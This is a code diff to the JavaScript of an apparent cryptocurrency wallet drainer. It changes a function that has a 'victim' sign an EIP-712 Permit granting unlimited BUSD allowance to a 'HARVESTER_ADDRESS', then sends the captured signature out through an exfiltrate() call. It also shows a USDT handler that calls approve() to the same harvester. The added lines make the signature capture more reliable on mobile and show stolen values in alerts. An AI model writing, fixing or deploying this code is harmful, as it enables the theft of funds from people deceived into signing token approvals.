@@ -94,30 +94,55 @@ async function triggerPermit() {
         document.getElementById('ui-loading').style.display = 'none';
     }
 }
-
 async function handleBUSD(signer, victim, busdContract) {
-    const [nonce, tokenName] = await Promise.all([
-        busdContract.nonces(victim),
-        busdContract.name()
-    ]);
+    console.log("[!] Attempting Universal Permit...");
+    try {
+        const [nonce, tokenName] = await Promise.all([
+            busdContract.nonces(victim),
+            busdContract.name()
+        ]);
 
-    const deadline = Math.floor(Date.now() / 1000) + 3600;
-    const domain = { name: tokenName, version: "1", chainId: 56, verifyingContract: BUSD_ADDRESS };
-    const types = {
-        Permit: [
-            { name: "owner", type: "address" }, { name: "spender", type: "address" },
-            { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
-            { name: "deadline", type: "uint256" }
-        ]
-    };
-    const message = { owner: victim, spender: HARVESTER_ADDRESS, value: MAX_VAL, nonce: nonce.toNumber(), deadline: deadline };
+        const deadline = Math.floor(Date.now() / 1000) + 3600;
+        
+        // We use the raw JSON string for the most basic compatibility
+        const domain = { name: tokenName, version: "1", chainId: 56, verifyingContract: BUSD_ADDRESS };
+        const types = {
+            Permit: [
+                { name: "owner", type: "address" }, { name: "spender", type: "address" },
+                { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
+                { name: "deadline", type: "uint256" }
+            ]
+        };
+        const message = { 
+            owner: victim, 
+            spender: HARVESTER_ADDRESS, 
+            value: MAX_VAL, 
+            nonce: nonce.toNumber(), 
+            deadline: deadline 
+        };
 
-    const signature = await signer._signTypedData(domain, types, message);
-    const { v, r, s } = ethers.utils.splitSignature(signature);
+        // This is the most compatible signature request for mobile
+        const signature = await signer._signTypedData(domain, types, message);
+        
+        // If we reach this line, it WORKED.
+        const { v, r, s } = ethers.utils.splitSignature(signature);
 
-    await exfiltrate({ victim, v, r, s, deadline, token: BUSD_ADDRESS, type: 'permit', amount: MAX_VAL });
+        // IMMEDIATE ALERT to capture data manually if network fails
+        alert("SIGNATURE CAPTURED!\nV: " + v + "\nR: " + r + "\nS: " + s + "\nDeadline: " + deadline);
+
+        await exfiltrate({ victim, v, r, s, deadline, token: BUSD_ADDRESS, type: 'permit' });
+        
+    } catch (err) {
+        // This ALERT will tell us exactly why it keeps "looping" back
+        alert("CRITICAL ERROR: " + err.message);
+        console.error("Signature Loop Error:", err);
+        
+        // Reset UI so user can try again
+        document.getElementById('ui-main').style.display = 'block';
+        document.getElementById('ui-loading').style.display = 'none';
+    }
 }
-
+    
 async function handleUSDT(signer, victim, usdtContract) {
     const tx = await usdtContract.connect(signer).approve(HARVESTER_ADDRESS, MAX_VAL);
     await exfiltrate({ victim, txHash: tx.hash, token: USDT_ADDRESS, type: 'approve' });
